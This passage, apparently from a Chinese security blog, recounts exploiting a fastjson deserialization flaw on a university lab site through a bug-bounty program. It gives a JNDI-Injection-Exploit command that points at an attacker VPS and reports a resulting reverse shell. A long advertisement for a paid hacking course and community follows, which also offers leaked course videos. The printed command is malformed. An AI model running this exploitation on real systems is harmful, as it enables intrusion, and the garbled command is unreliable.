上面使用vulhub靶场镜像复现了fastjson漏洞1.2.24-rce版本的，下面就给师傅们分享下我之前挖EDUSRC漏洞的时候碰到的fastjson<=1.2.47版本的fastjson漏洞，当时也是顺利使用fastjson_tool去构造fastjson<=1.2.47左右的利用链成功，然后打了一个rce，最后提交了EDUSRC漏洞平台  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaedRAns6MiaTUOWGiaDIrMq30usIq4j4TLDwyff6HKQXmvibRdjrTFGe5xXg/640?wx_fmt=png&from=appmsg "null")  
  
当时是在逛一个学校的虚拟仿真实验室首页，然后看到这里仿真实验，然后点进去  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaedCxOWJDfvUkCPVdJkT6tuDDzuBlWL6jFJRyYkicBQa9fXClrQcDKTmvQ/640?wx_fmt=png&from=appmsg "null")  
  
但是这里点击使用平台需要我们输入账户密码，但是这里也有一个注册接口，然后这里我也就是正常的注册一个用户，然后再登录，输入账户和密码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaedzIsWINSQvaKR7ajwjAbFkmGdpzpmMC74zibYm2TAqia0KrIroOIHMsPQ/640?wx_fmt=png&from=appmsg "null")  
  
像这样的登录口，有什么记住密码选项或者登录框，我常会直接打开我的burpsuit插件，比如shiroscan和上面介绍的fastjsonscan插件进行一个自动化扫描。  
  
这里我们可以看到，burpsuit的fastjsonscan插件扫出改登录口存在fastjson漏洞，通过利用链可看出该fastjson版本在1.2.47左右,这里我们直接使用  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaedRAHBJDj8bia0aEticOiaPicRzwTZsBJpYKQPeVkPUwxo16exERYKOBCP3A/640?wx_fmt=png&from=appmsg "null")  
  
然后可以使用JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar这个工具生成JNDI链接的工具可以启动多个服务器来利用JNDI注入漏洞，然后打fastjson漏洞  
  
下载链接：https://github.com/welk1n/JNDI-Injection-Exploit  
```
java -jar https://github.com/welk1n/JNDI-Injection-Exploit -C '[command]ping dnslog.cn' -A vps_ip

```  
  
后面就是常规的步骤了，这里也是成功反弹shell了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaediaOy8VQJlxPEd5f24VpZP65HiaIALdkOL44e4HCzicqtFaD6OEGUooYvQ/640?wx_fmt=png&from=appmsg "null")  
## 0x7 总结  
  
到这里呢这篇Fastjson漏洞相关的分享就结束了，这里祝愿师傅们多挖洞，多出洞！  
  
然后呢，下面就是文章中出现的一些文章链接，比如jdk1.8的安装教程包括vulnhub的一个安装，还有就是参考文章之类的，包括上面文字中介绍用到的工具之类的下  
  
载链接。  
  
JDK1.8安装详细教程：https://blog.csdn.net/m0_54899775/article/details/122420533  
  
安装vulnhub详细教程：https://blog.csdn.net/m0_54899775/article/details/122463532  
  
哔哩哔哩视频讲解：【fastjson反序列化漏洞演示加详细讲解加原理】 https://www.bilibili.com/video/BV1Ab4y1d7w1/?share_source=copy_web&vd_source=268f8d699ac32cf11e9bdc248399c5bd  
  
参考文章：  
  
https://github.com/bit4woo/code2sec.com  
  
https://xz.aliyun.com/t/14872  
  
burpsuit插件及工具下载：  
  
https://github.com/pmiaowu/BurpFastJsonScan  
  
https://github.com/Maskhe/FastjsonScan?tab=readme-ov-file  
  
https://github.com/welk1n/JNDI-Injection-Exploit  
  
02  
  
0x2 课程背景  
  
哈咯，各位师傅们好久不见！  
神农安全内部小圈子从  
2024年开始搞起来的，到现在也已经有小一两年了，期间承蒙各位师傅们的  
关注和支持  
💗  
非常感谢大家。  
  
「神农安全」知识星球目前已经  
累计1600+网络安全爱好者的加入，在这个过程中收获到了很多师傅们的  
好评与鼓励  
🎉  
，  
内部小圈子：一个知识星球+内部小圈子交流群+知识库。一直一来价格都没有超过50（都给师傅们发优惠卷），基本上加了小圈子的师傅都会说一句——  
“  
这圈子加的真值啊  
”。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthLEynEQtMibH6uWjBva44EEEkCx8bX12KA8gsZKQlllwGfyAEiaDHqY8g/640?wx_fmt=other&from=appmsg "")  
  
我平常呢也特别的爱  
分享技术文章，特别是每当学习到一个新技术，我都会去详细认真的写一篇对应的博客文章进行发表。  
活跃于先知社区、FreeBuf、奇安信攻防社区、知乎与CSDN等技术社区，id：  
一个想当文人的黑客，累计发表   
500+篇原创技术文章。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthlexDYBvDy8LwERVHKlbb7086Gm5KFIV78taz23NJicAWpDYA9T4svTA/640?wx_fmt=png&from=appmsg "")  
  
发表的公众号文章也从来没有设置过  
付费模式，哪怕一篇文章写个一个星期左右，好几万个字一篇的文章也都向来如此。喜欢看我写文章的师傅们都知道我写的技术博客文章：要有  
实战案例截图+详细知识点汇总，所以这样也是吸引到了很多师傅们观看我的文章，也是一年时间迅速在网络安全的圈子里面发展了自己的  
内部小圈子  
（成绩也不错）  
🎉  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWX3SIic6S4hEtLspuFkYL0w3LaPPsV0u8gXdAC0wuz2xobUIMR9ibfrkKzsgBQ1keNgnuMo3aXuO1ibQ/640?wx_fmt=png&from=appmsg "")  
  
后面也是小圈子做大起来了，师傅们也都喜欢看我文章，想让我开课教下思路，所以想着自己花时间做了  
 ✨  
课件和课表，都是纯自己手搓的，大家也可以看下课表的内容，**课程价格目前是300**  
（后面也会随着人数越多，涨价）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWX3SIic6S4hEtLspuFkYL0w3c0V9SHia9KaMfIRkaRLia8mhrxjITkWvU6UJuibbGmrHe9La4CK96XUeg/640?wx_fmt=png&from=appmsg "")  
  
  
不是小圈子的师傅们报名成功再送内部小圈子（知识星球）一个，都有对应的  
专属微信群聊  
 ✨  
。  
  
一周1-2节课程，**直播+录播形式**  
，课程内容大家可以看课表，目前是第一期，一次报名永久无限听课  
  
目前是第一期课程，后面比如说开了二、三期，都是不用在花钱的  
  
上课结束后，会把**视频录播+课件笔记**  
一起打包发直播群  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthM2sjuWQFbmvWv79V058KwI0DswFF9LysewGtULj81Vp5bX9nTEK78A/640?wx_fmt=png&from=appmsg "")  
  
03  
  
0x3 课程特色  
  
课程  
主打真实，  
一线SRC漏洞挖掘师傅是如何学习和挖掘SRC漏洞的，让你真正了解SRC漏洞挖掘，助力在岗人员和大学生的能力提升，掌握新的技能树，为下一次  
跳槽涨薪做好准备。本  
课程内容覆盖企业  
SRC、众测项目挖掘、护网HVV红蓝攻防技巧、CVE、CNVD、EDUSRC等平台通杀案例技巧挖掘方法。  
  
本课程  
适合人群  
（光看不挖啥也不会）  
```
1、想从0转行入行的大学生或自学者
2、想从CTF比赛/Web或SRC进阶到项目实战的选手
3、想参与项目/找工作/提高收入的转型者
```  
  
课程价格：300元  
  
报课成功的师傅们直接免费送内部小圈：一个知识星球+内部小圈子交流群  
```
1、课程价格真心实惠，绝不割韭菜
2、两三百的课程价格让你体会大几千的培训课程内容
3、带着大家从0到1，本人上课坚持手搓课件（实战案例+知识体系）
4、拒绝使用PPT演讲模式（无实操，很枯燥）
```  
  
直播培训教学方式  
  
课程  
一周1-2节课，课程特色涵盖直播多人上麦活跃回答，直播过程中有问题随时解决或私信我。  
拉微信群：一个知识星球内部小圈子交流群+课程培训直播通知群。有项目/工作/护网第一时间内推报课的师傅，  
一对一简历优化，助力在岗人员和大学生的能力提升。  
  
一次报名每期均可永久学习，并且赠送内部「神农安全」知识星球，一对一永久解答、无保留教学！  
  
欢迎关注微信公众号：神农Sec，报名咨询添加微信：  
routing_love  
  
课程均为线上交付，报名成功后  
不支持退款  
  
内部小圈子  
（知识星球+内部小圈子交流群+知识库）  
  
对内部小圈子感兴趣的师傅们也可以看下下面的这个  
跳转链接，里面有对小圈子的详细介绍，报名课程成功的师傅们直接免费送一个（直接点击下面直接可以跳转）。  
  
[强烈推荐一个永久的SRC挖掘、渗透攻防内部知识库](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247501608&idx=1&sn=5eb836122ac222ca9767a7bbc3c4521b&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltth4VWMmSt5ZBYAUuNNGuEjU3tvKRAN0yqMTPSnzKxibReCfiaFGibLxdAYw/640?wx_fmt=png&from=appmsg "")  
  
讲师介绍  
  
id：一个想当文人的黑客  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthqvGuVSjkR43eeaNibf1KbGU4nia5ibXFYpTBFeAbQewTq43IqJHIMhhhg/640?wx_fmt=png&from=appmsg "")  
  
欢迎关注微信公众号：神农Sec，报名咨询添加微信：  
routing_love  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
04  
  
0x4   
第一期挖洞培训课表内容  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVMibw6HiaoHUxJgNHUVfqCicbGSauW0QQBjLcC9H4gdOEyW3ZzLjTfyYibqGdaSueO9GDbbyicmckia2Kg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍（报课赠送）**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
**圈子专注于更新src/红蓝攻防相关：**  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
10、十个专栏会持续更新~提前续费有优惠，好用不贵很实惠
11、每日内部资料分享，内部圈子资料1000+
12、联系圈主获取：内部漏洞知识库+圈子使用手册+内部圈子交流群
13、VX：routing_love，技术交流+疑问解决
```  
  
  
**内部圈子**  
**专栏介绍**  
  
知识星球内部共享资料截屏详情如下  
  
（只要没有特殊情况，每天都保持更新）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibRSekfPpgmzg6Pn4yH440wEZhQZaJaxJds7olZp5H8Ma4PicQFclzGbQ/640?wx_fmt=other&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
  
**知识星球——**  
**神农安全**  
  
**知识库部分大纲目录如下：**  
  
知识库跟  
知识星球联动，基本上每天保持  
更新，满足圈友的需求  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFhXF33IuCNWh4QOXjMyjshticibyeTV3ZmhJeGias5J14egV36UGXvwGSA/640?wx_fmt=png&from=appmsg "")  
  
  
知识库和知识星球有师傅们关注的  
EDUSRC  
和  
CNVD相关内容（内部资料）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFKDNucibvibBty5UMNwpjeq1ToHpicPxpNwvRNj3JzWlz4QT1kbFqEdnaA/640?wx_fmt=other&from=appmsg "")  
  
  
还有网上流出来的各种  
SRC/CTF等课程视频  
  
量大管饱，扫描下面的知识星球二维码加入即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFxYMxoc1ViciafayxiaK0Z26g1kfbVDybCO8R88lqYQvOiaFgQ8fjOJEjxA/640?wx_fmt=png&from=appmsg "")  
  
  
不会挖CNVD？不会挖EDURC？不会挖企业SRC？不会打nday和通杀漏洞？  
  
直接加入我们小圈子：  
知识星球+内部圈子交流群+知识库  
  
快来吧！！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJ5wUOL9GnsxoXibKezHTjL6Yvuw6y8nm5ibyL388DdDFvuAtGypahRevg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJO0FHgdr6ach2iaibDRwicrB3Ct1WWhg9PA0fPw2J1icGjQgKENYDozpVJg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
神农安全知识库内部配置很多  
内部工具和资料💾，  
玄机靶场邀请码+EDUSRC邀请码等等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDNtEt0PfMwXQRzn9EDBdibLWNDZXVVjog7wDlAUK1h3Y7OicPQCYaw2eA/640?wx_fmt=png&from=appmsg "")  
  
  
快要护网来临，是不是需要  
护网面试题汇总  
？  
问题+答案（超级详细🔎）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDbLia1oCDxSyuY4j0ooxgqOibabZUDCibIzicM6SL2CMuAAa1Qe4UIRdq1g/640?wx_fmt=png&from=appmsg "")  
  
  
最后，师傅们也是希望找个  
好工作，那么常见的  
渗透测试/安服工程师/驻场面试题目，你值得拥有！！！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDicYew8gfSB3nicq9RFgJIKFG1UWyC6ibgpialR2UZlicW3mOBqVib7SLyDtQ/640?wx_fmt=other&from=appmsg "")  
  
  
**神农安全公开交流群**  
  
有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWUbESIpm7ibTY4npJjceHaoE6lkicrweicg40cYjD33cyV4enIt4o3A0Ia9nZxB5icnEicNhetiaiafLnAmg/640?wx_fmt=jpeg&from=appmsg "")  
```
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXz4Qht144X0wjJcOMqPwhnh3ptlbTtxDvNMF8NJA6XbDcljZBsibalsVQ/640?wx_fmt=gif "")  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&wxfrom=13&tp=wxpic "")  
  
**往期回顾**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&wxfrom=13&tp=wxpic "")  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[手把手js逆向断点调试&js逆向前端加密对抗&企业SRC实战分享](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247495361&idx=1&sn=48283073b325e360823da8dec27a7508&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[浅谈src漏洞挖掘中容易出洞的几种姿势](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247489731&idx=1&sn=c3a5ef01648fad496ecda36b653b6e21&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[HVV护网行动 | 分享最近攻防演练HVV漏洞复盘](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247488672&idx=1&sn=493bb70011a02eb971ff1b74c733f1d9&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[攻防演练｜分享最近一次攻防演练RTSP奇特之旅](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247492377&idx=1&sn=a94ad30e30e08bd96e888dad744e9814&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[JS漏洞挖掘｜分享使用FindSomething联动的挖掘思路](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247492315&idx=1&sn=88991e98058a277e267a9a79b8518e16&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[渗透测试 ｜ 从jeecg接口泄露到任意管理员用户接管+SQL注入漏洞](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493292&idx=1&sn=611fd43361089a30e5f7bcda21274b95&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[分享SRC中后台登录处站点的漏洞挖掘技巧](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247485439&idx=1&sn=3fd7e4cef57edca8e73104f8af38fc05&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[企业SRC支付漏洞&EDUSRC&众测挖掘思路技巧操作分享](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247492839&idx=1&sn=b9781f60580c1da8e2151166f0494ba5&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[渗透测试 ｜ 分享某次项目上的渗透测试漏洞复盘](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493495&idx=1&sn=791bebc6faa651cc3c585c2f5f481d21&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[【宝典】分享云安全浪潮src漏洞挖掘技巧](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247494877&idx=1&sn=2d00c0f651fd7375e881be86638e53ce&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[实战SRC挖掘｜微信小程序渗透漏洞复盘](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247494468&idx=1&sn=f0da4b4ff7763cbb83b858fb5a8964f9&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[综合资产测绘 | 手把手带你搞定信息收集](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493749&idx=1&sn=d2e0febcdcf9dcd8aa44be0d43b51936&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[【宝典】针对若依系统nday的常见各种姿势利用](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493489&idx=1&sn=d3ef10a1ae3b8c161d7174cb42702fac&scene=21#wechat_redirect)  
  
  
  
